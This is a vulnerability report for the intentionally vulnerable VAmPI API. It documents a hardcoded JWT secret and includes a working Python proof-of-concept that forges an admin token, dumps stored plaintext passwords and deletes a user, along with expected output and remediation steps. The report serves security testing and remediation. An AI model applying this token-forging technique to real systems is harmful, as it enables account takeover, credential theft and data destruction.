# C1 - Hardcoded JWT Secret Key: Proof of Concept

- **ID**: C1
- **Severity**: Critical
- **Vulnerability**: Hardcoded JWT Signing Secret
- **Affected File**: `config.py:13`
- **PoC-Status**: theoretical

---

## Summary

The application signs all JWT tokens with the hardcoded secret `'random'`
(`config.py:13`). Because the secret is public knowledge (committed to the
repository), any unauthenticated attacker can mint a valid, server-accepted JWT
for any username — including `admin` — without ever supplying a password.

The token is accepted by `User.decode_auth_token()` (`models/user_model.py:46`)
which calls `jwt.decode(..., vuln_app.app.config.get('SECRET_KEY'), ...)`. Since
the forged token is signed with the same `'random'` key, PyJWT considers it
legitimate and returns the payload. The `sub` claim in that payload is then used
as the authenticated identity throughout the application.

---

## Exploit Chain

```
attacker knows secret 'random' (public in repo)
  -> forge JWT with sub=admin, no expiry constraint
  -> send to any authenticated endpoint (e.g. GET /users/v1/admin,
     DELETE /users/v1/<victim>, GET /users/v1/_debug)
  -> server decodes token successfully, grants admin access
```

---

## PoC Script

```python
#!/usr/bin/env python3
"""
C1 - Hardcoded JWT Secret PoC
Forges an admin JWT using the known secret and calls authenticated endpoints.

Requirements: pip install pyjwt requests
Target:       http://localhost:5000  (default VAmPI Docker port)
"""

import sys
import datetime
import jwt
import requests

TARGET  = "http://localhost:5000"
SECRET  = "random"          # hardcoded in config.py:13
ALGO    = "HS256"
SUBJECT = "admin"           # target username seeded by init_db_users()

# ── 1. Forge admin JWT ────────────────────────────────────────────────────────
payload = {
    "sub": SUBJECT,
    "iat": datetime.datetime.utcnow(),
    "exp": datetime.datetime.utcnow() + datetime.timedelta(days=1),
}
forged_token = jwt.encode(payload, SECRET, algorithm=ALGO)
print(f"[+] Forged token : {forged_token}\n")

headers = {"Authorization": f"Bearer {forged_token}"}

# ── 2. /me  — confirm identity returned by server ────────────────────────────
r = requests.get(f"{TARGET}/users/v1/me", headers=headers)
print(f"[GET /users/v1/me]  {r.status_code}")
print(r.text, "\n")

# ── 3. /users/v1/_debug — dump all users (admin-only endpoint) ───────────────
r = requests.get(f"{TARGET}/users/v1/_debug", headers=headers)
print(f"[GET /users/v1/_debug]  {r.status_code}")
print(r.text, "\n")

# ── 4. DELETE a non-admin user (admin privilege action) ──────────────────────
r = requests.delete(f"{TARGET}/users/v1/name1", headers=headers)
print(f"[DELETE /users/v1/name1]  {r.status_code}")
print(r.text, "\n")

# ── 5. Confirm deletion ───────────────────────────────────────────────────────
r = requests.get(f"{TARGET}/users/v1/name1")
print(f"[GET /users/v1/name1 after delete]  {r.status_code}")
print(r.text)

if r.status_code == 404:
    print("\n[!] IMPACT CONFIRMED: admin-level user deletion via forged JWT.")
    sys.exit(0)
else:
    print("\n[-] Deletion step did not return 404 — check app state.")
    sys.exit(1)
```

---

## Expected Output

```
[+] Forged token : eyJ....<truncated>

[GET /users/v1/me]  200
{"status": "success", "data": {"username": "admin", "email": "admin@mail.com", "admin": true}}

[GET /users/v1/_debug]  200
{"users": [{"username": "name1", "password": "pass1", "email": "mail1@mail.com", "admin": false}, ...]}

[DELETE /users/v1/name1]  200
{"status": "success", "message": "User deleted."}

[GET /users/v1/name1 after delete]  404
{"status": "fail", "message": "User not found"}

[!] IMPACT CONFIRMED: admin-level user deletion via forged JWT.
```

---

## Impact

| Capability gained | Notes |
|---|---|
| Impersonate any user | Set `sub` to any registered username |
| Elevate to admin | `admin` account seeded at DB init (`init_db_users`) |
| Dump all credentials | `GET /users/v1/_debug` returns plaintext passwords |
| Delete arbitrary users | `DELETE /users/v1/<username>` requires admin token |
| Read any book secret | `GET /books/v1/<title>` BOLA + admin bypass |

Complete authentication is bypassed with zero prior knowledge of any password.

---

## Root Cause

```python
# config.py:13
vuln_app.app.config['SECRET_KEY'] = 'random'
```

The string `'random'` is committed in source control. Any party with repository
read access — including all contributors, CI runners, and anyone who forks the
repo — can reproduce this PoC immediately.

---

## Remediation

1. Replace the hardcoded literal with an environment variable:
   ```python
   import os, secrets
   vuln_app.app.config['SECRET_KEY'] = os.environ['JWT_SECRET_KEY']
   ```
2. Generate a strong random secret at deployment time
   (`python -c "import secrets; print(secrets.token_hex(32))"`).
3. Rotate all existing JWTs after the secret is changed (they are all
   compromised).
4. Add a pre-commit hook or CI check (e.g., `detect-secrets`) to reject
   hardcoded secret strings.
